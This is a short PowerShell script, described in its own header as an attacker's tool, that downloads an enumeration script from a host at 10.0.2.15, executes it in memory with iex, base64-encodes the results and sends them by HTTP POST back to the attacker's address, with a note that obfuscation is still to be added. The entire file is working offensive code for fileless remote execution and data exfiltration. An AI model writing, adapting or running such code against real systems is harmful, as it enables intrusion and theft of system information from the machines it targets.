
<#
    script used todownload the enumerationscript, execute in memory and send the output back to attacker
    Author: Luca Saija 
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
    Steps:
    1)Download enumeration script and execute in memory
    2)save output in variable
    3)base64 encode the variable
    4)send base64 result to attacker

    TODO:
    [] Add abfuscation


    #>

$enum = iex (New-Object Net.WebClient).downloadString('http://10.0.2.15:8080/enumScript.ps1')
$encoderesults = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($enum))

#send data back to attacker
$postParams = @{username=$encoderesults;}
$postParams
Invoke-WebRequest -Uri http://10.0.2.15:443/ -Method POST -Body $postParams
